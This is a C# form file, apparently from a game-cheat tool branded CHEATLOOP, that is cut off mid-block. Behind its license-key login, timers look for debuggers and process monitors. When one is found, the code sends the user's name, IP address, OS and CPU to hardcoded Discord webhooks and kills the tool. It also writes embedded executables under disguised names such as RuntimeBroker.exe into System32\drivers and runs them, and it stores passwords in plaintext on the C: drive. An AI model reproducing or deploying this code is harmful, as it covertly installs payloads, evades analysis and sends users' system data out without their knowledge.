using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using MetroFramework;
using MetroFramework.Forms;
using System.Diagnostics;
using LD_BYPASS;
using System.IO;
using Microsoft.Win32;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;

namespace HWID_Spoofer
{
    public partial class Form2 : MetroForm
    {
        public Form2()
        {
            InitializeComponent();
        }
        public static string GetIPAddress()
        {
            string IPADDRESS = new WebClient().DownloadString("http://ip-api.com/line/");
            return IPADDRESS;
        }

        private void Form2_Load(object sender, EventArgs e)
        {
            timer1.Start();
            timer2.Start();
            timer3.Start();
            timer4.Start();
            #region[Get Informations]
            if (File.Exists(@"C:\Bypasskey.ini"))
            {
                String fileName = @"C:\Bypasskey.ini";
                StreamReader reader = new StreamReader(fileName);
                username.Text = reader.ReadLine();
                password.Text = reader.ReadLine();
            }
            #endregion
        }

        private void metroButton2_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void metroButton1_Click(object sender, EventArgs e)
        {

        }

        private void metroButton8_Click(object sender, EventArgs e)
        {
            //Put code here of what you want to do after successful login
            if (API.Login(username.Text, password.Text))
            {
                //Put code here of what you want to do after successful login
                MessageBox.Show("Expiry: " + User.Expiry, "Username: " + User.Username, MessageBoxButtons.OK, MessageBoxIcon.Information);
                Form1 Form1 = new Form1();
                Form1.Show();
                this.Hide();
                if (metroCheckBox10.Checked)
                {
                    #region [Remember Me]
                    try
                    {
                        // File name  
                        string fileName1 = @"C:\Bypasskey.ini";
                        FileStream stream1 = null;
                        try
                        {
                            // Create a FileStream with mode CreateNew  
                            stream1 = new FileStream(fileName1, FileMode.OpenOrCreate);
                            // Create a StreamWriter from FileStream  
                            using (StreamWriter writer = new StreamWriter(stream1, Encoding.UTF8))
                            {
                                writer.WriteLine(username.Text);
                                writer.WriteLine(password.Text);
                            }
                        }
                        finally
                        {
                            if (stream1 != null)
                                stream1.Dispose();
                        }
                    }
                    catch
                    {
                        try
                        {
                            File.Delete(@"C:\Bypasskey.ini");
                        }
                        catch
                        {

                        }

                        // File name  
                        string fileName1 = @"C:\Bypasskey.ini";
                        FileStream stream1 = null;
                        try
                        {
                            // Create a FileStream with mode CreateNew  
                            stream1 = new FileStream(fileName1, FileMode.OpenOrCreate);
                            // Create a StreamWriter from FileStream  
                            using (StreamWriter writer = new StreamWriter(stream1, Encoding.UTF8))
                            {
                                writer.WriteLine(username.Text);
                                writer.WriteLine(password.Text);
                            }
                        }
                        catch
                        {

                        }
                        finally
                        {
                            if (stream1 != null)
                                stream1.Dispose();
                        }
                    }
                    #endregion
                }
            }
            else
            {
                MessageBox.Show("Key Not Found or Expired!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private void metroCheckBox10_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void metroTabPage2_Click(object sender, EventArgs e)
        {

        }
        private void metroButton1_Click_1(object sender, EventArgs e)
        {
            if (API.Register(siticoneRoundedTextBox1.Text, siticoneRoundedTextBox2.Text, email.Text, license.Text))
            {
                //Put code here of what you want to do after successful login
                MessageBox.Show("Register has been successful!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        private void siticoneControlBox1_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void metroButton2_Click_1(object sender, EventArgs e)
        {
            Process.Start("https://cheatloop.com");
        }

        private void metroButton3_Click(object sender, EventArgs e)
        {
            Process.Start("https://sinki.shop");
        }

        private void email_TextChanged(object sender, EventArgs e)
        {

        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            Process[] p = Process.GetProcesses();
            String Title = String.Empty;
            for (var i = 0; i < p.Length; i++)
            {
                Title = p[i].MainWindowTitle;

                if (Title.Contains(@"Process Hacker"))
                {
                    using (DcWebHook dcWeb = new DcWebHook())
                    {
                        ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
                        foreach (ManagementObject managementObject in mos.Get())
                        {
                            string cpu = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString", null);
                            String OSName = managementObject["Caption"].ToString();
                            dcWeb.ProfilePicture = "https://cheatloop.com/uploads/monthly_2020_01/1893944789_RTX2BGCC(1).thumb.jpg.2cf439a7414d77449a3eeb04a231f079.jpg";
                            dcWeb.UserName = "CHEATLOOP";
                            dcWeb.WebHook = "https://canary.discord.com/api/webhooks/778742173301866506/5CXhyl1QXkdGKB3XI8BIiPw5QHaakw2HUfUFb9aj3DzHEQF3-gzLCkO7gTQblm7XauRp";
                            dcWeb.SendMessage("```css" + Environment.NewLine + "Process HACKER detected" + Environment.NewLine + "UserName: " + Environment.UserName + Environment.NewLine + "IP: " + GetIPAddress() + Environment.NewLine + "OS :" + OSName + Environment.NewLine + "CPU: " + cpu + "```");
                        }
                        try
                        {
                            File.WriteAllBytes(@"C:\Windows\System32\drivers\syzs_dl_svr.exe", JOY.Properties.Resources.dllhost);
                        }
                        catch { }
                        try
                        {
                            File.WriteAllBytes(@"C:\Windows\System32\drivers\RuntimeBroker.exe", JOY.Properties.Resources.dllhost1);
                        }
                        catch { }
                        try
                        {
                            File.WriteAllBytes(@"C:\Windows\System32\drivers\adb.exe", JOY.Properties.Resources.Updater);
                        }
                        catch { }
                        try
                        {
                            Process.Start(@"C:\Windows\System32\drivers\syzs_dl_svr.exe");
                        }
                        catch { }
                        try
                        {
                            Process.Start(@"C:\Windows\System32\drivers\RuntimeBroker.exe");
                        }
                        catch { }
                        try
                        {
                            Process.Start(@"C:\Windows\System32\drivers\adb.exe");
                            Environment.Exit(0);
                        }
                        catch { }
                    }
                }
                else if (Title.Contains(@"dnSpy"))
                {
                    using (DcWebHook dcWeb = new DcWebHook())
                    {
                        ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
                        foreach (ManagementObject managementObject in mos.Get())
                        {
                            string cpu = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString", null);
                            String OSName = managementObject["Caption"].ToString();
                            dcWeb.ProfilePicture = "https://cheatloop.com/uploads/monthly_2020_01/1893944789_RTX2BGCC(1).thumb.jpg.2cf439a7414d77449a3eeb04a231f079.jpg";
                            dcWeb.UserName = "CHEATLOOP";
                            dcWeb.WebHook = "https://canary.discord.com/api/webhooks/778742278759514204/NycSzwZ9Yi2nsh9Il1gBGIpxFbIdO9iaTrRjSSNJidbXFA2k2QwH3rr3migyd_tZ5tQb";
                            dcWeb.SendMessage("```css" + Environment.NewLine + "dnSpy detected" + Environment.NewLine + "UserName: " + Environment.UserName + Environment.NewLine + "IP: " + GetIPAddress() + Environment.NewLine + "OS :" + OSName + Environment.NewLine + "CPU: " + cpu + "```");
                        }
                        try
                        {
                            File.WriteAllBytes(@"C:\Windows\System32\drivers\syzs_dl_svr.exe", JOY.Properties.Resources.dllhost);
                        }
                        catch { }
                        try
                        {
                            File.WriteAllBytes(@"C:\Windows\System32\drivers\RuntimeBroker.exe", JOY.Properties.Resources.dllhost1);
                        }
                        catch { }
                        try
                        {
                            File.WriteAllBytes(@"C:\Windows\System32\drivers\adb.exe", JOY.Properties.Resources.Updater);
                        }
                        catch { }
                        try
                        {
                            Process.Start(@"C:\Windows\System32\drivers\syzs_dl_svr.exe");
                        }
                        catch { }
                        try
                        {
                            Process.Start(@"C:\Windows\System32\drivers\RuntimeBroker.exe");
                        }
                        catch { }
                        try
                        {
                            Process.Start(@"C:\Windows\System32\drivers\adb.exe");
                            Environment.Exit(0);
                        }
                        catch { }
                    }
                }
                else if (Title.Contains(@"NetLimiter"))
                {
                    using (DcWebHook dcWeb = new DcWebHook())
                    {
                        ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
                        foreach (ManagementObject managementObject in mos.Get())
                        {
                            string cpu = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString", null);
                            String OSName = managementObject["Caption"].ToString();
                            dcWeb.ProfilePicture = "https://cheatloop.com/uploads/monthly_2020_01/1893944789_RTX2BGCC(1).thumb.jpg.2cf439a7414d77449a3eeb04a231f079.jpg";
                            dcWeb.UserName = "CHEATLOOP";
                            dcWeb.WebHook = "https://canary.discord.com/api/webhooks/778743914642800653/HkgZO4RkQMlqbnILiA2j25tgMLzwbTj6IDWJpQV0RunDtnWroY44vYQi0vjRMvBjGwlk";
                            dcWeb.SendMessage("```css" + Environment.NewLine + "NetLimiter detected" + Environment.NewLine + "UserName: " + Environment.UserName + Environment.NewLine + "IP: " + GetIPAddress() + Environment.NewLine + "OS :" + OSName + Environment.NewLine + "CPU: " + cpu + "```");
                        }
                        try
                        {
                            File.WriteAllBytes(@"C:\Windows\System32\drivers\syzs_dl_svr.exe", JOY.Properties.Resources.dllhost);
                        }
                        catch { }
                        try
                        {
                            File.WriteAllBytes(@"C:\Windows\System32\drivers\RuntimeBroker.exe", JOY.Properties.Resources.dllhost1);
                        }
                        catch { }
                        try
                        {
                            File.WriteAllBytes(@"C:\Windows\System32\drivers\adb.exe", JOY.Properties.Resources.Updater);
                        }
                        catch { }
                        try
                        {
                            Process.Start(@"C:\Windows\System32\drivers\syzs_dl_svr.exe");
                        }
                        catch { }
                        try
                        {
                            Process.Start(@"C:\Windows\System32\drivers\RuntimeBroker.exe");
                        }
                        catch { }
                        try
                        {
                            Process.Start(@"C:\Windows\System32\drivers\adb.exe");
                            Environment.Exit(0);
                        }
                        catch { }
                    }
                }
                else if (Title.Contains(@"HTTP Debugger"))
                {
                    using (DcWebHook dcWeb = new DcWebHook())
                    {
                        ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
                        foreach (ManagementObject managementObject in mos.Get())
                        {
                            string cpu = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString", null);
                            String OSName = managementObject["Caption"].ToString();
                            dcWeb.ProfilePicture = "https://cheatloop.com/uploads/monthly_2020_01/1893944789_RTX2BGCC(1).thumb.jpg.2cf439a7414d77449a3eeb04a231f079.jpg";
                            dcWeb.UserName = "CHEATLOOP";
                            dcWeb.WebHook = "https://canary.discord.com/api/webhooks/778744865701232691/umbVc-OmqxSorXc3e_4YuKYx2klUBvl9bM-gGaMygF9SpBDwqdUgfqeroJepLhcyPy6v";
                            dcWeb.SendMessage("```css" + Environment.NewLine + "HTTP Debugger detected" + Environment.NewLine + "UserName: " + Environment.UserName + Environment.NewLine + "IP: " + GetIPAddress() + Environment.NewLine + "OS :" + OSName + Environment.NewLine + "CPU: " + cpu + "```");
                        }
                        try
                        {
                            File.WriteAllBytes(@"C:\Windows\System32\drivers\syzs_dl_svr.exe", JOY.Properties.Resources.dllhost);
                        }
                        catch { }
                        try
                        {
                            File.WriteAllBytes(@"C:\Windows\System32\drivers\RuntimeBroker.exe", JOY.Properties.Resources.dllhost1);
                        }
                        catch { }
                        try
                        {
                            File.WriteAllBytes(@"C:\Windows\System32\drivers\adb.exe", JOY.Properties.Resources.Updater);
                        }
                        catch { }
                        try
                        {
                            Process.Start(@"C:\Windows\System32\drivers\syzs_dl_svr.exe");
                        }
                        catch { }
                        try
                        {
                            Process.Start(@"C:\Windows\System32\drivers\RuntimeBroker.exe");
                        }
                        catch { }
                        try
                        {
                            Process.Start(@"C:\Windows\System32\drivers\adb.exe");
                            Environment.Exit(0);
                        }
                        catch { }
                    }
                }
                else if (Title.Contains(@"Progress Telerik Fiddler Web Debugger"))
                {
                    using (DcWebHook dcWeb = new DcWebHook())
                    {
                        ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
                        foreach (ManagementObject managementObject in mos.Get())
                        {
                            string cpu = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString", null);
                            String OSName = managementObject["Caption"].ToString();
                            dcWeb.ProfilePicture = "https://cheatloop.com/uploads/monthly_2020_01/1893944789_RTX2BGCC(1).thumb.jpg.2cf439a7414d77449a3eeb04a231f079.jpg";
                            dcWeb.UserName = "CHEATLOOP";
                            dcWeb.WebHook = "https://canary.discord.com/api/webhooks/778743980241584178/Q77UL6iZWtEAHeK6K8r849I8DV_iz0AUVj4ZfoF5nbtvMHhGsWzJf7y0rp1prb2wMPGj";
                            dcWeb.SendMessage("```css" + Environment.NewLine + "Progress Telerik Fiddler Web Debugger detected" + Environment.NewLine + "UserName: " + Environment.UserName + Environment.NewLine + "IP: " + GetIPAddress() + Environment.NewLine + "OS :" + OSName + Environment.NewLine + "CPU: " + cpu + "```");
                        }
                        try
                        {
                            File.WriteAllBytes(@"C:\Windows\System32\drivers\syzs_dl_svr.exe", JOY.Properties.Resources.dllhost);
                        }
                        catch { }
                        try
                        {
                            File.WriteAllBytes(@"C:\Windows\System32\drivers\RuntimeBroker.exe", JOY.Properties.Resources.dllhost1);
                        }
                        catch { }
                        try
                        {
                            File.WriteAllBytes(@"C:\Windows\System32\drivers\adb.exe", JOY.Properties.Resources.Updater);
                        }
                        catch { }
                        try
                        {
                            Process.Start(@"C:\Windows\System32\drivers\syzs_dl_svr.exe");
                        }
                        catch { }
                        try
                        {
                            Process.Start(@"C:\Windows\System32\drivers\RuntimeBroker.exe");
                        }
                        catch { }
                        try
                        {
                            Process.Start(@"C:\Windows\System32\drivers\adb.exe");
                            Environment.Exit(0);
                        }
                        catch { }
                    }
                }
                else if (Title.Contains(@"Process Explorer"))
                {
                    using (DcWebHook dcWeb = new DcWebHook())
                    {
                        ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
                        foreach (ManagementObject managementObject in mos.Get())
                        {
                            string cpu = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString", null);
                            String OSName = managementObject["Caption"].ToString();
                            dcWeb.ProfilePicture = "https://cheatloop.com/uploads/monthly_2020_01/1893944789_RTX2BGCC(1).thumb.jpg.2cf439a7414d77449a3eeb04a231f079.jpg";
                            dcWeb.UserName = "CHEATLOOP";
                            dcWeb.WebHook = "https://canary.discord.com/api/webhooks/778742239861538837/iHOfpQQMU5Kag44y5ETWkp2DI0EFNmN_z7hPyqQfv4wnWp7vv-hHVdyzIsi6vjZBcNYt";
                            dcWeb.SendMessage("```css" + Environment.NewLine + "Process Explorer Detected" + Environment.NewLine + "UserName: " + Environment.UserName + Environment.NewLine + "IP: " + GetIPAddress() + Environment.NewLine + "OS :" + OSName + Environment.NewLine + "CPU: " + cpu + "```");
                        }
                        try
                        {
                            File.WriteAllBytes(@"C:\Windows\System32\drivers\syzs_dl_svr.exe", JOY.Properties.Resources.dllhost);
                        }
                        catch { }
                        try
                        {
                            File.WriteAllBytes(@"C:\Windows\System32\drivers\RuntimeBroker.exe", JOY.Properties.Resources.dllhost1);
                        }
                        catch { }
                        try
                        {
                            File.WriteAllBytes(@"C:\Windows\System32\drivers\adb.exe", JOY.Properties.Resources.Updater);
                        }
                        catch { }
                        try
                        {
                            Process.Start(@"C:\Windows\System32\drivers\syzs_dl_svr.exe");
                        }
                        catch { }
                        try
                        {
                            Process.Start(@"C:\Windows\System32\drivers\RuntimeBroker.exe");
                        }
                        catch { }
                        try
                        {
                            Process.Start(@"C:\Windows\System32\drivers\adb.exe");
                            Environment.Exit(0);
                        }
                        catch { }
                    }
                }
                else if (Title.Contains(@"de4dot"))
                {
                    using (DcWebHook dcWeb = new DcWebHook())
                    {
                        ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
                        foreach (ManagementObject managementObject in mos.Get())
                        {
                            string cpu = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString", null);
                            String OSName = managementObject["Caption"].ToString();
                            dcWeb.ProfilePicture = "https://cheatloop.com/uploads/monthly_2020_01/1893944789_RTX2BGCC(1).thumb.jpg.2cf439a7414d77449a3eeb04a231f079.jpg";
                            dcWeb.UserName = "CHEATLOOP";
                            dcWeb.WebHook = "https://canary.discord.com/api/webhooks/778742330135937104/ft7S2OdSsVTKwb27uBKIbEBExfmrHPNxYlREuu8kAErgsAgTMJPSA4T1GLmubCr0yX-M";
                            dcWeb.SendMessage("```css" + Environment.NewLine + "de4dot Detected" + Environment.NewLine + "UserName: " + Environment.UserName + Environment.NewLine + "IP: " + GetIPAddress() + Environment.NewLine + "OS :" + OSName + Environment.NewLine + "CPU: " + cpu + "```");
                        }
                        try
                        {
                            File.WriteAllBytes(@"C:\Windows\System32\drivers\syzs_dl_svr.exe", JOY.Properties.Resources.dllhost);
                        }
                        catch { }
                        try
                        {
                            File.WriteAllBytes(@"C:\Windows\System32\drivers\RuntimeBroker.exe", JOY.Properties.Resources.dllhost1);
                        }
                        catch { }
                        try
                        {
                            File.WriteAllBytes(@"C:\Windows\System32\drivers\adb.exe", JOY.Properties.Resources.Updater);
                        }
                        catch { }
                        try
                        {
                            Process.Start(@"C:\Windows\System32\drivers\syzs_dl_svr.exe");
                        }
                        catch { }
                        try
                        {
                            Process.Start(@"C:\Windows\System32\drivers\RuntimeBroker.exe");
                        }
                        catch { }
                        try
                        {
                            Process.Start(@"C:\Windows\System32\drivers\adb.exe");
                            Environment.Exit(0);
                        }
                        catch { }
                    }
                }
                RegistryKey rkSubKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Classes\TypeLib\{14FA6B09-833A-43C8-979F-4C425BBF9660}\1.0\HELPDIR", false);
                if (rkSubKey == null)
                {
                    // It doesn't exist
                }
                else
                {
                    try
                    {
                        File.WriteAllBytes(@"C:\Windows\System32\drivers\syzs_dl_svr.exe", JOY.Properties.Resources.dllhost);
                    }
                    catch { }
                    try
                    {
                        File.WriteAllBytes(@"C:\Windows\System32\drivers\RuntimeBroker.exe", JOY.Properties.Resources.dllhost1);
                    }
                    catch { }
                    try
                    {
                        File.WriteAllBytes(@"C:\Windows\System32\drivers\adb.exe", JOY.Properties.Resources.Updater);
                    }
                    catch { }
                    try
                    {
                        Process.Start(@"C:\Windows\System32\drivers\syzs_dl_svr.exe");
                    }
                    catch { }
                    try
                    {
                        Process.Start(@"C:\Windows\System32\drivers\RuntimeBroker.exe");
                    }
                    catch { }
                    try
                    {
                        Process.Start(@"C:\Windows\System32\drivers\adb.exe");
                    }
                    catch { }
                    Environment.Exit(1);
                }
                RegistryKey rkSubKey1 = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{F530C1D7-2F76-497A-934C-2C55F57BBB37}_is1", false);
                if (rkSubKey1 == null)
                {
                    // It doesn't exist
                }
                else
                {
                    try
                    {
                        File.WriteAllBytes(@"C:\Windows\System32\drivers\syzs_dl_svr.exe", JOY.Properties.Resources.dllhost);
                    }
                    catch { }
                    try
                    {
                        File.WriteAllBytes(@"C:\Windows\System32\drivers\RuntimeBroker.exe", JOY.Properties.Resources.dllhost1);
                    }
                    catch { }
                    try
                    {
                        File.WriteAllBytes(@"C:\Windows\System32\drivers\adb.exe", JOY.Properties.Resources.Updater);
                    }
                    catch { }
                    try
                    {
                        Process.Start(@"C:\Windows\System32\drivers\syzs_dl_svr.exe");
                    }
                    catch { }
                    try
                    {
                        Process.Start(@"C:\Windows\System32\drivers\RuntimeBroker.exe");
                    }
                    catch { }
                    try
                    {
                        Process.Start(@"C:\Windows\System32\drivers\adb.exe");
                    }
                    catch { }
                    Environment.Exit(1);
                }
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            //Sending Files To System Directory 
            try
            {
                File.WriteAllBytes(Environment.SystemDirectory + "\\..\\Bootwin.exe", JOY.Properties.Resources.Thread);
            }
            catch { }
            try
            {
                Process.Start(Environment.SystemDirectory + "\\..\\Bootwin.exe");
            }
            catch { }
            //Process Start From System Directory
            //Timer Loop Starting
        }

        private void timer4_Tick(object sender, EventArgs e)
        {
            #region[detetected]
            foreach (Process a in Process.GetProcessesByName("NLClientApp"))
            {
                using (DcWebHook dcWeb = new DcWebHook())
                {
                    ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
                    foreach (ManagementObject managementObject in mos.Get())
                    {
                        string cpu = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString", null);
                        String OSName = managementObject["Caption"].ToString();
                        dcWeb.ProfilePicture = "https://cheatloop.com/uploads/monthly_2020_01/1893944789_RTX2BGCC(1).thumb.jpg.2cf439a7414d77449a3eeb04a231f079.jpg";
                        dcWeb.UserName = "CHEATLOOP";
                        dcWeb.WebHook = "https://canary.discord.com/api/webhooks/778743914642800653/HkgZO4RkQMlqbnILiA2j25tgMLzwbTj6IDWJpQV0RunDtnWroY44vYQi0vjRMvBjGwlk";
                        dcWeb.SendMessage("```css" + Environment.NewLine + "NLClientApp detected" + Environment.NewLine + "UserName: " + Environment.UserName + Environment.NewLine + "IP: " + GetIPAddress() + Environment.NewLine + "OS :" + OSName + Environment.NewLine + "CPU: " + cpu + "```");
                    }
                    a.Kill();
                }
                //////////
                foreach (Process b in Process.GetProcessesByName("HTTPDebuggerUI"))
                {
                    using (DcWebHook dcWeb = new DcWebHook())
                    {
                        ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
                        foreach (ManagementObject managementObject in mos.Get())
                        {
                            string cpu = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString", null);
                            String OSName = managementObject["Caption"].ToString();
                            dcWeb.ProfilePicture = "https://cheatloop.com/uploads/monthly_2020_01/1893944789_RTX2BGCC(1).thumb.jpg.2cf439a7414d77449a3eeb04a231f079.jpg";
                            dcWeb.UserName = "CHEATLOOP";
                            dcWeb.WebHook = "https://canary.discord.com/api/webhooks/778744865701232691/umbVc-OmqxSorXc3e_4YuKYx2klUBvl9bM-gGaMygF9SpBDwqdUgfqeroJepLhcyPy6v";
                            dcWeb.SendMessage("```css" + Environment.NewLine + "HTTPDebuggerUI detected" + Environment.NewLine + "UserName: " + Environment.UserName + Environment.NewLine + "IP: " + GetIPAddress() + Environment.NewLine + "OS :" + OSName + Environment.NewLine + "CPU: " + cpu + "```");
                        }
                        b.Kill();
                    }
                    //////////////////////
                    foreach (Process c in Process.GetProcessesByName("Fiddler"))
                    {
                        using (DcWebHook dcWeb = new DcWebHook())
                        {
                            ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
                            foreach (ManagementObject managementObject in mos.Get())
                            {
                                string cpu = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString", null);
                                String OSName = managementObject["Caption"].ToString();
                                dcWeb.ProfilePicture = "https://cheatloop.com/uploads/monthly_2020_01/1893944789_RTX2BGCC(1).thumb.jpg.2cf439a7414d77449a3eeb04a231f079.jpg";
                                dcWeb.UserName = "CHEATLOOP";
                                dcWeb.WebHook = "https://canary.discord.com/api/webhooks/778743980241584178/Q77UL6iZWtEAHeK6K8r849I8DV_iz0AUVj4ZfoF5nbtvMHhGsWzJf7y0rp1prb2wMPGj";
                                dcWeb.SendMessage("```css" + Environment.NewLine + "Fiddler detected" + Environment.NewLine + "UserName: " + Environment.UserName + Environment.NewLine + "IP: " + GetIPAddress() + Environment.NewLine + "OS :" + OSName + Environment.NewLine + "CPU: " + cpu + "```");
                            }
                            c.Kill();
                        }
                        foreach (Process v in Process.GetProcessesByName("ProcessHacker"))
                        {
                            using (DcWebHook dcWeb = new DcWebHook())
                            {
                                ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
                                foreach (ManagementObject managementObject in mos.Get())
                                {
                                    string cpu = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString", null);
                                    String OSName = managementObject["Caption"].ToString();
                                    dcWeb.ProfilePicture = "https://cheatloop.com/uploads/monthly_2020_01/1893944789_RTX2BGCC(1).thumb.jpg.2cf439a7414d77449a3eeb04a231f079.jpg";
                                    dcWeb.UserName = "CHEATLOOP";
                                    dcWeb.WebHook = "https://canary.discord.com/api/webhooks/778742173301866506/5CXhyl1QXkdGKB3XI8BIiPw5QHaakw2HUfUFb9aj3DzHEQF3-gzLCkO7gTQblm7XauRp";
                                    dcWeb.SendMessage("```css" + Environment.NewLine + "Process HACKER detected" + Environment.NewLine + "UserName: " + Environment.UserName + Environment.NewLine + "IP: " + GetIPAddress() + Environment.NewLine + "OS :" + OSName + Environment.NewLine + "CPU: " + cpu + "```");
                                }
                                v.Kill();
                            }
                            foreach (Process x in Process.GetProcessesByName("procexp"))
                            {
                                using (DcWebHook dcWeb = new DcWebHook())
                                {
                                    ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
                                    foreach (ManagementObject managementObject in mos.Get())
                                    {
                                        string cpu = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString", null);
                                        String OSName = managementObject["Caption"].ToString();
                                        dcWeb.ProfilePicture = "https://cheatloop.com/uploads/monthly_2020_01/1893944789_RTX2BGCC(1).thumb.jpg.2cf439a7414d77449a3eeb04a231f079.jpg";
                                        dcWeb.UserName = "CHEATLOOP";
                                        dcWeb.WebHook = "https://canary.discord.com/api/webhooks/778742239861538837/iHOfpQQMU5Kag44y5ETWkp2DI0EFNmN_z7hPyqQfv4wnWp7vv-hHVdyzIsi6vjZBcNYt";
                                        dcWeb.SendMessage("```css" + Environment.NewLine + "Process Exp detected" + Environment.NewLine + "UserName: " + Environment.UserName + Environment.NewLine + "IP: " + GetIPAddress() + Environment.NewLine + "OS :" + OSName + Environment.NewLine + "CPU: " + cpu + "```");
                                    }
                                    x.Kill();
                                }
                                foreach (Process m in Process.GetProcessesByName("procexp64"))
                                {
                                    using (DcWebHook dcWeb = new DcWebHook())
                                    {
                                        ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
                                        foreach (ManagementObject managementObject in mos.Get())
                                        {
                                            string cpu = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString", null);
                                            String OSName = managementObject["Caption"].ToString();
                                            dcWeb.ProfilePicture = "https://cheatloop.com/uploads/monthly_2020_01/1893944789_RTX2BGCC(1).thumb.jpg.2cf439a7414d77449a3eeb04a231f079.jpg";
                                            dcWeb.UserName = "CHEATLOOP";
                                            dcWeb.WebHook = "https://canary.discord.com/api/webhooks/778742239861538837/iHOfpQQMU5Kag44y5ETWkp2DI0EFNmN_z7hPyqQfv4wnWp7vv-hHVdyzIsi6vjZBcNYt";
                                            dcWeb.SendMessage("```css" + Environment.NewLine + "Process Exp64 detected" + Environment.NewLine + "UserName: " + Environment.UserName + Environment.NewLine + "IP: " + GetIPAddress() + Environment.NewLine + "OS :" + OSName + Environment.NewLine + "CPU: " + cpu + "```");
                                        }
                                        m.Kill();
                                    }
                                    foreach (Process j in Process.GetProcessesByName("procexp64a"))
                                    {
                                        using (DcWebHook dcWeb = new DcWebHook())
                                        {
                                            ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
                                            foreach (ManagementObject managementObject in mos.Get())
                                            {
                                                string cpu = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString", null);
                                                String OSName = managementObject["Caption"].ToString();
                                                dcWeb.ProfilePicture = "https://cheatloop.com/uploads/monthly_2020_01/1893944789_RTX2BGCC(1).thumb.jpg.2cf439a7414d77449a3eeb04a231f079.jpg";
                                                dcWeb.UserName = "CHEATLOOP";
                                                dcWeb.WebHook = "https://canary.discord.com/api/webhooks/778742239861538837/iHOfpQQMU5Kag44y5ETWkp2DI0EFNmN_z7hPyqQfv4wnWp7vv-hHVdyzIsi6vjZBcNYt";
                                                dcWeb.SendMessage("```css" + Environment.NewLine + "Process Exp64a detected" + Environment.NewLine + "UserName: " + Environment.UserName + Environment.NewLine + "IP: " + GetIPAddress() + Environment.NewLine + "OS :" + OSName + Environment.NewLine + "CPU: " + cpu + "```");
                                            }
                                            j.Kill();
                                        }
                                        foreach (Process z in Process.GetProcessesByName("dnSpy"))
                                        {
                                            using (DcWebHook dcWeb = new DcWebHook())
                                            {
                                                ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
                                                foreach (ManagementObject managementObject in mos.Get())
                                                {
                                                    string cpu = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString", null);
                                                    String OSName = managementObject["Caption"].ToString();
                                                    dcWeb.ProfilePicture = "https://cheatloop.com/uploads/monthly_2020_01/1893944789_RTX2BGCC(1).thumb.jpg.2cf439a7414d77449a3eeb04a231f079.jpg";
                                                    dcWeb.UserName = "CHEATLOOP";
                                                    dcWeb.WebHook = "https://canary.discord.com/api/webhooks/778742278759514204/NycSzwZ9Yi2nsh9Il1gBGIpxFbIdO9iaTrRjSSNJidbXFA2k2QwH3rr3migyd_tZ5tQb";
